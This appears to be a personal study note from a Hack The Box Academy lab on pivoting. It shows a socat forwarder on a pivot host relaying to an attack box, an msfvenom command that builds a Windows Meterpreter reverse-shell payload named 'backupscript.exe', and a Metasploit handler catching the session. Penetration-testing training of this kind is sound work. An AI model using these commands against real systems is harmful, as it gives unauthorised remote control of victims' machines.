Socat Redirection with a Reverse Shell
######################################

Date: 2024-11-02 14:33

Status:

Tags: 

Description
***********

Socat is a tool that creates pip sockets between 2 independent network channels.  Socat can listen on one host and port forward that data to another IP address. 

Given two boxes, attack server and pivot server. 


Example: setting up socat with a reverse shell
==============================================

Step 1: Start socat on the pivot server. 

.. code-block:: console

    socat TCP4-LISTEN:8080,fork TCP4:10.10.14.18:80

This creates a listener on 8080 and forwards all packets to our attack box on port 80. 

Step 2: Create a reverse shell payload for a Windows host

.. code-block:: console

    msfvenom -p windows/x64/meterpreter/reverse_https LHOST=172.16.5.129 -f exe -o backupscript.exe LPORT=8080


Step 3: Start a multi/handler

.. code-block:: console 

    msf6 > use exploit/multi/handler

    [*] Using configured payload generic/shell_reverse_tcp
    msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_https
    payload => windows/x64/meterpreter/reverse_https
    msf6 exploit(multi/handler) > set lhost 0.0.0.0
    lhost => 0.0.0.0
    msf6 exploit(multi/handler) > set lport 80
    lport => 80
    msf6 exploit(multi/handler) > run

    [*] Started HTTPS reverse handler on https://0.0.0.0:80

Once the session is established you can test the connection with :

.. code-block::

    meterpreter > getuid
    Server username: INLANEFREIGHT\victor


References
**********
https://academy.hackthebox.com/module/158/section/1430


